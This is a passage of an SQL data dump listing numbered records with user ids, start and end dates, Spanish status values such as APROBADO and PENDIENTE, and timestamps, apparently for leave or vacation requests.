12:11:36'),(124,201,'2020-01-25','2022-07-22','APROBADO',NULL,'2020-01-27 07:53:00','2022-06-13 04:37:49'),(126,200,'2020-02-15','2022-07-23','APROBADO',NULL,'2020-02-15 23:59:20','2022-06-24 05:52:47'),(127,241,'2020-02-15','2021-10-11','APROBADO',NULL,'2020-02-17 05:41:26','2021-10-13 05:06:11'),(128,292,'2020-02-22','2022-08-01','APROBADO',NULL,'2020-02-24 05:53:11','2022-03-11 06:00:39'),(129,233,'2020-03-07','2023-05-17','PENDIENTE',NULL,'2020-03-09 13:30:12','2023-02-06 07:52:33'),(131,253,'2020-03-28','2020-08-25','PENDIENTE',NULL,'2020-03-30 07:00:28','2020-06-05 07:23:44'),(132,196,'2019-11-09','2020-07-09','APROBADO',NULL,'2020-05-18 11:28:03','2020-06-09 09:02:47'),(133,196,'2020-02-01','2020-07-16','APROBADO',NULL,'2020-05-18 11:28:14','2020-06-30 06:21:37'),(134,244,'2020-06-13','2021-09-11','APROBADO',NULL,'2020-06-15 22:29:23','2021-07-27 05:12:49'),(135,253,'2020-07-04','2021-08-18','PENDIENTE',NULL,'2020-07-06 05:33:10','2021-05-04 10:08:33'),(136,190,'2020-07-11','2022-10-02','APROBADO',NULL,'2020-07-13 05:27:18','2022-08-30 05:06:18'),(137,201,'2020-07-11','2022-07-23','APROBADO',NULL,'2020-07-14 04:58:31','2022-06-13 04:37:52'),(138,196,'2020-07-18','2021-07-12','APROBADO',NULL,'2020-07-20 05:00:23','2021-04-14 05:07:41'),(139,200,'2020-08-08','2022-07-24','APROBADO',NULL,'2020-08-08 22:50:32','2022-06-24 05:52:59'),(140,292,'2020-08-08','2022-08-02','APROBADO',NULL,'2020-08-10 20:37:09','2022-03-11 06:00:43'),(141,233,'2020-08-22','2023-05-18','PENDIENTE',NULL,'2020-08-25 05:16:06','2023-02-06 07:52:42'),(142,190,'2020-10-03','2022-12-28','APROBADO',NULL,'2020-10-05 05:54:53','2022-11-02 07:00:53'),(143,201,'2020-10-03','2022-07-24','APROBADO',NULL,'2020-10-06 07:54:49','2022-06-13 04:37:55'),(144,253,'2020-10-10','2021-08-19','PENDIENTE',NULL,'2020-10-14 14:01:27','2021-05-04 10:08:59'),(145,200,'2020-10-24','2023-05-01','APROBADO',NULL,'2020-10-24 23:56:44','2023-04-17 05:48:44'),(146,241,'2020-10-24','2021-10-18','APROBADO',NULL,'2020-10-27 06:01:44','2021-10-19 10:34:01'),(147,233,'2020-11-14','2023-05-19','PENDIENTE',NULL,'2020-11-16 14:08:16','2023-02-06 07:52:56'),(148,201,'2020-12-26','2023-09-27','APROBADO',NULL,'2021-01-04 10:56:10','2023-09-11 06:32:16'),(149,196,'2021-01-02','2021-07-15','APROBADO',NULL,'2021-01-05 06:20:14','2021-04-14 05:07:21'),(150,253,'2021-01-16','2021-08-22','APROBADO',NULL,'2021-01-18 09:52:39','2023-02-28 10:33:37'),(151,233,'2021-01-16','2023-05-20','PENDIENTE',NULL,'2021-01-18 09:55:11','2023-02-06 07:53:12'),(152,241,'2021-01-16','2021-10-19','APROBADO',NULL,'2021-01-19 06:06:29','2021-10-19 10:34:11'),(153,244,'2020-11-28','2021-09-12','APROBADO',NULL,'2021-02-11 16:19:56','2021-07-27 05:12:53'),(154,244,'2021-02-20','2022-06-08','APROBADO',NULL,'2021-02-23 01:55:05','2022-05-02 06:10:21'),(155,200,'2021-02-20','2022-07-30','APROBADO',NULL,'2021-02-23 06:06:45','2022-06-24 05:53:49'),(156,233,'2021-02-27','2023-05-21','PENDIENTE',NULL,'2021-03-02 07:56:00','2023-02-06 07:53:21'),(157,197,'2021-03-13','2022-09-21','APROBADO',NULL,'2021-03-13 00:41:18','2022-03-17 07:55:14'),(158,200,'2021-04-03','2022-07-31','APROBADO',NULL,'2021-04-07 12:08:05','2022-06-24 05:53:57'),(159,233,'2021-04-10','2023-05-22','PENDIENTE',NULL,'2021-04-11 14:42:22','2023-02-06 07:53:30'),(160,241,'2021-04-10',NULL,'DISPONIBLE',NULL,'2021-04-14 11:01:37','2021-04-14 11:01:37'),(161,196,'2021-06-19','2021-07-14','APROBADO',NULL,'2021-04-19 06:57:28','2021-04-19 06:57:48'),(162,253,'2021-04-24','2021-08-20','PENDIENTE',NULL,'2021-04-26 06:28:09','2021-05-04 10:11:04'),(163,291,'2021-10-23','2025-12-26','APROBADO',NULL,'2021-05-10 04:58:55','2025-11-26 06:32:42'),(164,200,'2021-05-15','2024-07-06','APROBADO',NULL,'2021-05-17 19:31:26','2024-03-18 05:51:51'),(165,244,'2021-05-15','2022-06-09','APROBADO',NULL,'2021-05-20 04:47:57','2022-05-02 06:10:28'),(167,197,'2021-06-05','2022-09-22','APROBADO',NULL,'2021-06-16 08:37:15','2022-03-17 07:55:20'),(168,200,'2021-06-26','2024-07-07','APROBADO',NULL,'2021-06-29 12:52:25','2024-03-18 05:51:59'),(171,241,'2021-07-03',NULL,'DISPONIBLE',NULL,'2021-07-16 12:11:08','2021-07-16 12:11:08'),(172,247,'2021-07-17','2023-10-04','APROBADO',NULL,'2021-07-18 02:48:44','2023-06-26 09:22:57'),(174,253,'2021-07-31','2023-08-06','PENDIENTE',NULL,'2021-08-02 06:22:46','2023-02-28 10:58:05'),(175,428,'2021-08-07','2024-06-05','APROBADO',NULL,'2021-08-12 04:56:17','2024-03-21 07:11:46'),(176,202,'2021-08-07','2022-08-15','SOLICITADO',NULL,'2021-08-13 09:03:22','2022-01-10 14:21:29'),(177,306,'2021-08-21','2022-12-05','APROBADO',NULL,'2021-08-24 10:33:17','2022-10-24 10:06:09'),(179,201,'2021-09-11','2023-09-28','APROBADO',NULL,'2021-09-11 23:44:29','2023-09-11 06:32:21'),(180,457,'2021-09-11','2022-12-08','APROBADO',NULL,'2021-09-17 05:31:27','2022-11-28 04:44:31'),(181,200,'2021-09-18','2025-05-22','APROBADO',NULL,'2021-09-19 05:01:43','2025-05-08 05:25:28'),(182,167,'2021-10-16','2022-08-15','APROBADO',NULL,'2021-10-15 07:37:48','2022-08-08 08:10:57'),(184,200,'2021-10-30',NULL,'DISPONIBLE',NULL,'2021-10-30 23:10:24','2021-10-30 23:10:24'),(186,253,'2021-11-06','2023-08-04','PENDIENTE',NULL,'2021-11-08 13:21:18','2023-02-28 10:57:33'),(188,202,'2021-11-13','2022-08-16','SOLICITADO',NULL,'2021-11-15 11:47:24','2022-01-10 14:21:57'),(189,239,'2021-11-13','2022-08-17','APROBADO',NULL,'2021-11-15 21:31:52','2022-03-18 07:29:54'),(190,306,'2021-11-27','2022-12-06','APROBADO',NULL,'2021-11-29 07:45:06','2022-10-24 10:06:13'),(191,200,'2021-12-11',NULL,'DISPONIBLE',NULL,'2021-12-15 13:16:49','2021-12-15 13:16:49'),(192,241,'2021-12-18',NULL,'DISPONIBLE',NULL,'2021-12-19 05:39:11','2021-12-19 05:39:11'),(195,292,'2021-12-25','2022-08-03','APROBADO',NULL,'2021-12-26 03:08:42','2022-03-11 06:00:46'),(196,247,'2022-01-01','2023-10-05','APROBADO',NULL,'2022-01-01 23:19:24','2023-06-26 09:23:03'),(198,167,'2022-01-22','2022-08-14','APROBADO',NULL,'2022-01-19 15:40:36','2022-08-08 08:11:10'),(199,244,'2022-01-22','2022-07-10','APROBADO',NULL,'2022-01-23 04:28:25','2022-06-30 05:35:39'),(200,451,'2021-11-20',NULL,'APROBADO',NULL,'2022-01-31 13:19:42','2026-01-28 08:43:55'),(201,451,'2021-11-27','2022-08-26','APROBADO',NULL,'2022-01-31 13:20:16','2022-03-18 12:48:37'),(203,239,'2022-02-05','2022-08-18','APROBADO',NULL,'2022-02-06 23:21:00','2022-03-18 07:30:02'),(205,253,'2022-02-12','2023-08-05','PENDIENTE',NULL,'2022-02-14 12:24:20','2023-02-28 10:57:52'),(206,457,'2022-02-19','2023-01-26','SOLICITADO',NULL,'2022-02-19 23:13:33','2023-01-10 18:59:39'),(207,202,'2022-02-19','2023-08-10','SOLICITADO',NULL,'2022-02-21 09:06:44','2023-02-23 10:58:25'),(208,196,'2022-02-26','2023-08-21','APROBADO',NULL,'2022-02-26 22:04:08','2023-05-11 06:00:51'),(209,200,'2022-03-05',NULL,'DISPONIBLE',NULL,'2022-03-06 05:15:45','2022-03-06 05:15:45'),(211,247,'2022-03-26','2025-02-03','APROBADO',NULL,'2022-03-26 22:41:10','2025-01-09 05:58:18'),(213,244,'2022-04-16','2023-07-31','APROBADO',NULL,'2022-04-17 02:46:02','2023-04-25 05:06:34'),(214,200,'2022-04-16',NULL,'DISPONIBLE',NULL,'2022-04-17 04:11:47','2022-04-17 04:11:47'),(215,443,'2022-04-23','2023-05-01','APROBADO',NULL,'2022-04-25 04:47:33','2023-04-25 06:57:42'),(218,167,'2022-04-30','2022-08-13','APROBADO',NULL,'2022-04-28 08:39:03','2022-08-08 08:11:40'),(219,451,'2022-05-14','2023-08-08','APROBADO',NULL,'2022-05-11 18:06:08','2023-06-26 09:27:17'),(220,197,'2022-05-07','2024-07-24','APROBADO',NULL,'2022-05-19 05:57:39','2024-01-23 13:29:10'),(221,201,'2022-05-21','2023-09-29','APROBADO',NULL,'2022-05-22 03:23:38','2023-09-11 06:32:25'),(222,202,'2022-05-28','2023-08-11','SOLICITADO',NULL,'2022-05-30 12:39:51','2023-02-23 10:58:53'),(223,306,'2022-06-11','2026-08-10','PENDIENTE',NULL,'2022-06-13 01:02:10','2026-03-23 15:56:40'),(224,241,'2022-06-04',NULL,'DISPONIBLE',NULL,'2022-06-14 04:44:27','2022-06-14 04:44:27'),(225,306,'2022-03-05','2022-09-29','PENDIENTE',NULL,'2022-06-17 11:59:34','2024-01-22 11:15:40'),(226,247,'2022-06-18','2025-06-19','APROBADO',NULL,'2022-06-18 22:33:53','2025-04-13 08:11:23'),(227,201,'2022-07-02','2023-10-31','APROBADO',NULL,'2022-07-02 21:38:14','2023-10-09 04:32:58'),(229,244,'2022-07-09','2023-08-01','APROBADO',NULL,'2022-07-10 00:08:47','2023-04-25 05:06:43'),(230,200,'2022-07-09',NULL,'DISPONIBLE',NULL,'2022-07-10 04:43:40','2022-07-10 04:43:40'),(232,443,'2022-07-16','2023-05-27','APROBADO',NULL,'2022-07-26 11:47:39','2023-04-25 06:57:51'),(233,451,'2022-07-30','2023-08-09','APROBADO',NULL,'2022-07-30 03:57:24','2023-06-26 09:27:26'),(234,378,'2022-07-30',NULL,'APROBADO',NULL,'2022-08-01 10:20:28','2025-08-24 13:57:36'),(235,371,'2022-07-30','2023-08-16','PENDIENTE',NULL,'2022-08-01 10:20:48','2023-07-17 09:01:36'),(236,167,'2022-08-06','2023-02-18','SOLICITADO',NULL,'2022-08-08 07:47:45','2023-01-02 14:32:46'),(237,457,'2022-08-13','2023-02-25','SOLICITADO',NULL,'2022-08-14 02:02:08','2023-01-10 18:59:50'),(238,200,'2022-08-20',NULL,'DISPONIBLE',NULL,'2022-08-21 05:05:53','2022-08-21 05:05:53'),(239,239,'2022-07-23','2023-08-14','APROBADO',NULL,'2022-08-25 12:59:59','2023-04-11 05:22:20'),(240,292,'2022-09-03','2024-09-09','APROBADO',NULL,'2022-09-03 21:57:34','2024-06-13 08:25:50'),(241,202,'2022-09-03','2023-08-12','SOLICITADO',NULL,'2022-09-07 08:08:31','2023-02-23 10:59:18'),(242,451,'2022-09-10','2023-08-10','APROBADO',NULL,'2022-09-10 23:02:42','2023-06-26 09:27:31'),(243,306,'2022-09-17','2026-08-11','PENDIENTE',NULL,'2022-09-19 06:00:59','2026-03-23 15:56:50'),(244,378,'2022-09-17',NULL,'APROBADO',NULL,'2022-09-19 06:11:01','2025-08-24 13:57:22'),(245,201,'2022-09-24','2023-11-02','APROBADO',NULL,'2022-09-25 04:18:56','2023-10-09 12:22:30'),(246,457,'2022-09-24','2023-01-19','APROBADO',NULL,'2022-09-29 19:23:53','2023-01-04 08:12:40'),(247,451,'2022-10-01','2026-02-21','APROBADO',NULL,'2022-10-01 20:41:45','2026-01-28 08:44:30'),(248,200,'2022-10-01',NULL,'DISPONIBLE',NULL,'2022-10-01 22:28:10','2022-10-01 22:28:10'),(249,443,'2022-10-08','2025-05-03','APROBADO',NULL,'2022-10-12 05:35:27','2025-03-25 05:53:57'),(250,239,'2022-10-15','2023-08-15','APROBADO',NULL,'2022-10-20 12:55:37','2023-04-11 05:22:14'),(251,197,'2022-10-22','2024-07-25','APROBADO',NULL,'2022-10-23 01:12:35','2024-01-23 13:29:16'),(253,196,'2022-11-05','2023-08-25','APROBADO',NULL,'2022-11-06 21:00:01','2023-05-10 06:36:48'),(254,371,'2022-11-05','2023-08-17','PENDIENTE',NULL,'2022-11-08 14:16:23','2023-07-17 09:02:04'),(255,167,'2022-11-12','2023-06-25','APROBADO',NULL,'2022-11-11 08:16:54','2023-05-15 06:42:30'),(257,200,'2022-11-12',NULL,'DISPONIBLE',NULL,'2022-11-13 04:58:08','2022-11-13 04:58:08'),(258,292,'2022-11-26',NULL,'DISPONIBLE',NULL,'2022-11-26 23:20:38','2022-11-26 23:20:38'),(259,451,'2022-12-03','2026-02-22','APROBADO',NULL,'2022-12-03 21:47:36','2026-01-28 08:44:34'),(260,253,'2022-12-03','2023-08-03','PENDIENTE',NULL,'2022-12-07 09:40:47','2023-02-28 10:56:18'),(261,202,'2022-12-10','2023-08-13','SOLICITADO',NULL,'2022-12-16 11:23:51','2023-02-23 10:59:38'),(263,239,'2023-01-07','2024-06-28','APROBADO',NULL,'2023-01-07 22:10:46','2024-04-12 05:04:17'),(264,197,'2023-01-14','2025-12-22','APROBADO',NULL,'2023-01-15 03:51:07','2025-11-03 06:54:51'),(266,197,'2018-11-24','2023-09-13','APROBADO',NULL,'2023-01-19 12:18:10','2023-07-21 06:41:25'),(267,197,'2019-05-11','2023-09-14','APROBADO',NULL,'2023-01-19 12:18:43','2023-07-21 06:41:32'),(268,197,'2022-02-12','2023-09-22','APROBADO',NULL,'2023-01-19 12:19:27','2023-07-21 06:41:39'),(269,196,'2023-01-28','2024-08-23','APROBADO',NULL,'2023-01-29 20:51:06','2024-02-05 06:15:33'),(270,200,'2023-02-04',NULL,'DISPONIBLE',NULL,'2023-02-05 04:20:54','2023-02-05 04:20:54'),(272,291,'2022-01-15','2026-02-14','APROBADO',NULL,'2023-02-16 06:28:11','2026-01-23 06:02:41'),(273,291,'2022-04-09',NULL,'DISPONIBLE',NULL,'2023-02-16 06:28:43','2023-02-23 11:40:09'),(274,292,'2022-03-19','2024-09-08','APROBADO',NULL,'2023-02-16 07:00:04','2024-06-13 08:25:48'),(275,292,'2023-02-18',NULL,'DISPONIBLE',NULL,'2023-02-19 05:54:59','2023-02-19 05:54:59'),(276,247,'2023-02-25','2025-08-26','APROBADO',NULL,'2023-02-26 05:05:23','2025-04-13 08:11:11'),(278,253,'2023-03-11','2024-08-16','PENDIENTE',NULL,'2023-03-13 09:05:50','2025-04-30 16:16:35'),(279,244,'2023-03-18','2023-08-02','APROBADO',NULL,'2023-03-18 22:38:23','2023-04-25 05:06:47'),(280,200,'2023-03-18',NULL,'DISPONIBLE',NULL,'2023-03-19 05:13:13','2023-03-19 05:13:13'),(281,202,'2023-03-18','2024-08-07','APROBADO',NULL,'2023-03-20 07:26:12','2024-07-22 08:23:35'),(283,239,'2023-04-01','2024-06-29','APROBADO',NULL,'2023-04-01 20:03:13','2024-04-12 05:04:24'),(284,306,'2023-04-01','2026-08-15','PENDIENTE',NULL,'2023-04-03 07:58:27','2026-03-23 15:57:00'),(285,197,'2023-04-08',NULL,'DISPONIBLE',NULL,'2023-04-08 21:08:46','2023-04-09 08:43:34'),(286,196,'2023-04-22','2024-08-24','APROBADO',NULL,'2023-04-22 20:30:41','2024-02-05 06:15:38'),(287,200,'2023-04-29',NULL,'DISPONIBLE',NULL,'2023-04-30 03:46:36','2023-04-30 03:46:36'),(289,378,'2023-04-29','2025-09-05','APROBADO',NULL,'2023-05-02 06:21:26','2025-08-24 14:00:42'),(290,451,'2023-05-20',NULL,'DISPONIBLE',NULL,'2023-05-20 20:28:22','2023-05-20 20:28:22'),(291,371,'2023-05-20','2023-08-14','PENDIENTE',NULL,'2023-05-22 10:44:58','2023-07-17 09:02:27'),(292,167,'2023-05-27','2024-04-03','APROBADO',NULL,'2023-05-25 14:09:49','2024-03-22 12:25:22'),(293,244,'2023-06-10','2023-09-28','PENDIENTE',NULL,'2023-06-11 00:56:08','2023-10-02 08:40:47'),(294,200,'2023-06-10',NULL,'DISPONIBLE',NULL,'2023-06-11 01:47:38','2023-06-11 01:47:38'),(295,455,'2023-06-17','2024-07-05','APROBADO',NULL,'2023-06-18 01:11:09','2024-04-08 05:47:00'),(296,253,'2023-06-17','2025-06-29','PENDIENTE',NULL,'2023-06-19 07:02:39','2025-04-30 16:17:21'),(297,239,'2023-06-24','2024-06-30','APROBADO',NULL,'2023-06-24 19:56:29','2024-04-12 05:04:31'),(298,202,'2023-06-24','2024-08-08','APROBADO',NULL,'2023-06-26 14:57:20','2024-07-22 08:23:45'),(299,197,'2023-07-01',NULL,'DISPONIBLE',NULL,'2023-07-01 20:07:20','2023-07-01 20:07:20'),(301,428,'2021-10-30','2025-11-22','APROBADO',NULL,'2023-07-03 06:04:51','2025-11-04 06:08:49'),(302,89,'2023-07-01',NULL,'DISPONIBLE',NULL,'2023-07-04 10:39:28','2023-07-04 10:39:28'),(303,306,'2023-07-08','2026-08-16','PENDIENTE',NULL,'2023-07-10 07:13:30','2026-03-23 15:57:22'),(304,451,'2023-07-08',NULL,'DISPONIBLE',NULL,'2023-07-11 12:55:56','2023-07-11 12:55:56'),(305,196,'2023-07-15','2024-08-25','APROBADO',NULL,'2023-07-15 21:28:17','2024-02-05 06:15:56'),(306,201,'2023-07-15','2025-07-23','APROBADO',NULL,'2023-07-16 00:46:58','2025-07-08 05:24:24'),(307,455,'2023-07-22','2024-07-04','APROBADO',NULL,'2023-07-24 13:08:44','2024-04-08 05:47:06'),(308,467,'2023-07-29','2024-08-06','APROBADO',NULL,'2023-07-30 01:51:29','2024-02-12 08:25:39'),(309,292,'2023-08-05',NULL,'DISPONIBLE',NULL,'2023-08-06 05:18:35','2023-08-06 05:18:35'),(310,247,'2023-08-12','2025-08-27','APROBADO',NULL,'2023-08-12 23:15:12','2025-04-13 08:10:14'),(311,458,'2023-08-12',NULL,'DISPONIBLE',NULL,'2023-08-12 23:17:41','2023-08-12 23:17:41'),(312,378,'2023-08-19',NULL,'DISPONIBLE',NULL,'2023-08-24 09:50:30','2023-08-24 09:50:30'),(313,201,'2023-08-26','2025-07-24','APROBADO',NULL,'2023-08-27 00:18:11','2025-07-08 05:24:29'),(314,455,'2023-08-26','2026-07-03','APROBADO',NULL,'2023-08-29 04:11:39','2026-02-10 06:26:29'),(315,244,'2023-09-02','2025-06-04','APROBADO',NULL,'2023-09-03 02:03:04','2025-06-04 04:28:06'),(316,167,'2023-09-02','2024-04-04','APROBADO',NULL,'2023-09-04 06:36:31','2024-03-22 12:25:00'),(317,455,'2023-09-09','2026-07-04','APROBADO',NULL,'2023-09-10 03:42:17','2026-02-10 06:26:33'),(318,239,'2023-09-16','2025-01-11','SOLICITADO',NULL,'2023-09-16 23:15:53','2024-12-12 12:00:42'),(319,197,'2023-09-23',NULL,'DISPONIBLE',NULL,'2023-09-23 15:50:46','2023-09-23 15:50:46'),(320,253,'2023-09-23',NULL,'DISPONIBLE',NULL,'2023-09-24 12:11:30','2023-09-24 12:11:30'),(321,201,'2023-10-07','2025-08-19','APROBADO',NULL,'2023-10-07 22:34:16','2025-08-11 15:06:42'),(322,196,'2023-10-07','2024-08-05','APROBADO',NULL,'2023-10-08 19:57:13','2024-02-23 06:30:31'),(323,306,'2023-10-14',NULL,'DISPONIBLE',NULL,'2023-10-16 06:26:18','2023-10-16 06:26:18'),(324,202,'2023-09-30','2024-08-09','APROBADO',NULL,'2023-10-16 06:28:04','2024-07-22 08:23:40'),(325,292,'2023-10-28',NULL,'DISPONIBLE',NULL,'2023-10-29 02:16:43','2023-10-29 02:16:43'),(326,456,'2023-11-18','2025-02-22','APROBADO',NULL,'2023-11-09 13:56:09','2025-02-11 05:53:58'),(327,201,'2023-11-18','2025-08-20','APROBADO',NULL,'2023-11-19 01:12:10','2025-08-11 15:06:46'),(328,244,'2023-11-25','2024-09-23','APROBADO',NULL,'2023-11-26 01:45:03','2024-09-02 06:08:19'),(329,200,'2023-11-25',NULL,'DISPONIBLE',NULL,'2023-11-26 05:45:22','2023-11-26 05:45:22'),(330,455,'2023-12-02','2026-07-05','APROBADO',NULL,'2023-12-04 05:55:50','2026-02-10 06:26:38'),(331,378,'2023-12-02',NULL,'DISPONIBLE',NULL,'2023-12-04 09:34:12','2023-12-04 09:34:12'),(332,239,'2023-12-09','2026-08-28','APROBADO',NULL,'2023-12-09 20:50:24','2026-02-25 06:18:14'),(333,459,'2023-12-16','2024-05-19','SOLICITADO',NULL,'2023-12-15 22:03:05','2024-05-08 09:58:55'),(334,467,'2023-12-30','2024-08-07','APROBADO',NULL,'2023-12-22 16:58:04','2024-02-12 08:25:46'),(335,450,'2023-12-23','2025-06-27','APROBADO',NULL,'2023-12-25 21:29:55','2025-06-03 07:53:11'),(336,196,'2023-12-30','2024-08-06','APROBADO',NULL,'2023-12-30 21:00:10','2024-02-23 06:30:38'),(337,253,'2023-12-30',NULL,'DISPONIBLE',NULL,'2024-01-08 08:20:36','2024-01-08 08:20:36'),(338,202,'2024-01-06','2024-08-10','APROBADO',NULL,'2024-01-08 09:21:07','2024-07-22 08:23:49'),(339,455,'2024-01-13','2026-07-06','APROBADO',NULL,'2024-01-14 01:08:11','2026-02-10 06:26:43'),(340,449,'2024-01-20','2024-07-20','APROBADO',NULL,'2024-01-18 13:58:53','2024-06-10 05:35:14'),(341,292,'2024-01-20',NULL,'DISPONIBLE',NULL,'2024-01-20 23:20:18','2024-01-20 23:20:18'),(342,306,'2024-01-20',NULL,'DISPONIBLE',NULL,'2024-01-22 07:40:33','2024-01-22 07:40:33'),(343,378,'2024-01-27',NULL,'DISPONIBLE',NULL,'2024-01-25 15:26:57','2024-01-25 15:26:57'),(344,469,'2024-01-27',NULL,'DISPONIBLE',NULL,'2024-01-26 08:15:44','2024-01-26 08:15:44'),(345,459,'2024-01-27','2025-07-24','APROBADO',NULL,'2024-01-27 00:40:33','2025-07-03 11:18:28'),(346,455,'2024-02-03','2026-07-07','APROBADO',NULL,'2024-02-04 20:42:22','2026-02-10 06:26:47'),(347,247,'2024-02-03','2025-08-28','APROBADO',NULL,'2024-02-04 22:03:27','2025-04-13 08:10:52'),(348,456,'2024-02-10',NULL,'DISPONIBLE',NULL,'2024-02-10 21:29:38','2024-02-10 21:29:38'),(349,201,'2024-02-10','2025-08-21','APROBADO',NULL,'2024-02-10 23:35:37','2025-08-11 15:06:52'),(350,467,'2024-02-17','2025-04-17','APROBADO',NULL,'2024-02-15 20:17:46','2025-01-07 06:22:40'),(351,244,'2024-02-17','2024-09-24','SOLICITADO',NULL,'2024-02-18 04:38:54','2024-09-01 20:06:11'),(352,459,'2024-02-24','2025-07-25','APROBADO',NULL,'2024-02-23 22:29:53','2025-07-03 11:18:33'),(353,476,'2024-02-24','2024-09-16','APROBADO',NULL,'2024-02-25 20:57:15','2024-07-24 11:17:54'),(354,449,'2024-03-02','2024-07-21','APROBADO',NULL,'2024-03-01 13:26:14','2024-06-10 05:35:20'),(355,456,'2024-03-02',NULL,'DISPONIBLE',NULL,'2024-03-01 22:03:08','2024-03-01 22:03:08'),(356,371,'2024-03-09','2024-10-09','APROBADO',NULL,'2024-03-11 08:08:45','2024-10-03 07:23:17'),(357,450,'2024-03-09','2026-01-12','APROBADO',NULL,'2024-03-12 04:45:54','2025-12-29 06:19:01'),(358,451,'2024-03-16',NULL,'DISPONIBLE',NULL,'2024-03-16 00:51:01','2024-03-16 00:51:01'),(359,196,'2024-03-23','2024-04-18','APROBADO',NULL,'2024-03-23 21:05:06','2024-04-04 04:49:02'),(360,201,'2024-03-23','2026-07-25','APROBADO',NULL,'2024-03-23 23:01:46','2026-05-04 05:30:24'),(361,200,'2024-03-30',NULL,'DISPONIBLE',NULL,'2024-03-31 04:24:00','2024-03-31 04:24:00'),(362,455,'2024-04-06','2026-07-08','APROBADO',NULL,'2024-04-06 23:15:34','2026-02-10 06:26:53'),(363,482,'2024-04-06',NULL,'DISPONIBLE',NULL,'2024-04-07 03:08:53','2024-04-07 03:08:53'),(364,253,'2024-04-06',NULL,'DISPONIBLE',NULL,'2024-04-08 06:30:23','2024-04-08 06:30:23'),(365,467,'2024-04-13','2025-04-18','APROBADO',NULL,'2024-04-12 21:12:55','2025-01-07 06:22:44'),(366,483,'2024-04-13',NULL,'DISPONIBLE',NULL,'2024-04-13 23:01:23','2024-04-13 23:01:23'),(367,202,'2024-04-13','2024-07-02','SOLICITADO',NULL,'2024-04-15 08:28:39','2024-04-22 13:21:44'),(368,455,'2024-04-20','2026-06-05','APROBADO',NULL,'2024-04-22 00:30:18','2026-02-10 06:26:57'),(369,450,'2024-04-27','2026-08-10','APROBADO',NULL,'2024-04-27 23:42:39','2026-05-04 05:22:49'),(370,456,'2024-04-27',NULL,'DISPONIBLE',NULL,'2024-04-28 04:26:50','2024-04-28 04:26:50'),(371,476,'2024-04-27','2024-09-17','APROBADO',NULL,'2024-04-28 05:05:35','2024-07-24 11:17:59'),(372,306,'2024-04-27',NULL,'DISPONIBLE',NULL,'2024-04-29 06:19:29','2024-04-29 06:19:29'),(373,201,'2024-05-04',NULL,'DISPONIBLE',NULL,'2024-05-04 21:57:14','2024-05-04 21:57:14'),(374,456,'2024-05-11',NULL,'DISPONIBLE',NULL,'2024-05-10 20:25:44','2024-05-10 20:25:44'),(375,200,'2024-05-11',NULL,'DISPONIBLE',NULL,'2024-05-12 04:22:49','2024-05-12 04:22:49'),(376,443,'2024-05-18','2025-05-31','APROBADO',NULL,'2024-05-19 01:35:55','2025-05-14 05:25:08'),(377,469,'2024-05-18',NULL,'DISPONIBLE',NULL,'2024-05-20 15:36:08','2024-05-20 15:36:08'),(378,449,'2024-05-25','2024-08-31','APROBADO',NULL,'2024-05-24 19:27:45','2024-08-19 05:11:26'),(379,486,'2024-05-25','2025-07-05','APROBADO',NULL,'2024-05-25 21:54:03','2025-02-08 06:55:52'),(380,239,'2024-05-25','2026-08-29','APROBADO',NULL,'2024-05-25 21:56:23','2026-02-25 06:18:21'),(381,467,'2024-06-01','2025-04-19','APROBADO',NULL,'2024-05-30 20:20:46','2025-01-07 06:22:47'),(382,455,'2024-06-01','2026-06-06','APROBADO',NULL,'2024-06-02 04:06:02','2026-02-10 06:27:02'),(383,451,'2024-06-08',NULL,'DISPONIBLE',NULL,'2024-06-08 23:11:57','2024-06-08 23:11:57'),(384,196,'2024-06-15','2025-08-19','APROBADO',NULL,'2024-06-15 20:10:51','2025-01-29 11:20:28'),(385,371,'2024-06-15','2025-07-19','PENDIENTE',NULL,'2024-06-17 07:11:30','2025-10-06 08:35:44'),(386,201,'2024-06-15',NULL,'DISPONIBLE',NULL,'2024-06-17 11:32:48','2024-06-17 11:32:48'),(387,467,'2024-06-29','2025-04-21','APROBADO',NULL,'2024-06-27 20:21:19','2025-01-07 06:22:52'),(388,483,'2024-06-29',NULL,'DISPONIBLE',NULL,'2024-06-28 23:25:19','2024-06-28 23:25:19'),(389,292,'2024-07-06',NULL,'DISPONIBLE',NULL,'2024-07-07 04:39:18','2024-07-07 04:39:18'),(390,449,'2024-07-06','2024-09-01','APROBADO',NULL,'2024-07-08 15:32:01','2024-08-19 05:11:39'),(391,469,'2024-07-13',NULL,'DISPONIBLE',NULL,'2024-07-11 14:38:09','2024-07-11 14:38:09'),(392,455,'2024-07-13','2026-06-07','APROBADO',NULL,'2024-07-14 03:57:39','2026-02-10 06:27:08'),(393,459,'2024-07-20','2025-07-26','APROBADO',NULL,'2024-07-20 20:03:27','2025-07-03 11:18:39'),(394,469,'2024-07-27',NULL,'DISPONIBLE',NULL,'2024-07-22 08:23:14','2024-07-22 08:23:14'),(395,483,'2024-07-27',NULL,'DISPONIBLE',NULL,'2024-07-27 20:53:36','2024-07-27 20:53:36'),(396,201,'2024-07-27',NULL,'DISPONIBLE',NULL,'2024-07-28 04:00:13','2024-07-28 04:00:13'),(397,244,'2024-08-03','2024-09-25','SOLICITADO',NULL,'2024-08-03 23:29:34','2024-09-01 20:07:03'),(398,200,'2024-08-03',NULL,'DISPONIBLE',NULL,'2024-08-04 04:16:10','2024-08-04 04:16:10'),(399,306,'2024-08-03',NULL,'DISPONIBLE',NULL,'2024-08-05 07:48:16','2024-08-05 07:48:16'),(400,459,'2024-08-10','2025-07-27','APROBADO',NULL,'2024-08-10 20:32:20','2025-07-03 11:18:45'),(401,467,'2024-08-10','2025-04-22','APROBADO',NULL,'2024-08-10 21:38:41','2025-01-07 06:22:55'),(402,449,'2024-08-17','2025-06-21','APROBADO',NULL,'2024-08-17 21:28:39','2025-03-17 06:02:02'),(403,239,'2024-08-17','2026-08-30','APROBADO',NULL,'2024-08-18 00:04:16','2026-02-25 06:18:29'),(404,465,'2024-08-17',NULL,'DISPONIBLE',NULL,'2024-08-18 00:05:55','2024-09-05 09:18:03'),(405,197,'2024-08-24',NULL,'DISPONIBLE',NULL,'2024-08-25 02:53:51','2024-08-25 02:53:51'),(406,402,'2024-08-31','2024-09-28','PENDIENTE',NULL,'2024-08-27 16:17:38','2025-10-06 09:19:04'),(407,455,'2024-08-31','2026-04-20','APROBADO',NULL,'2024-09-01 03:01:59','2026-03-10 09:14:14'),(408,196,'2024-09-07','2025-08-20','APROBADO',NULL,'2024-09-07 19:38:49','2025-01-29 11:20:49'),(409,201,'2024-09-07',NULL,'DISPONIBLE',NULL,'2024-09-08 03:19:47','2024-09-08 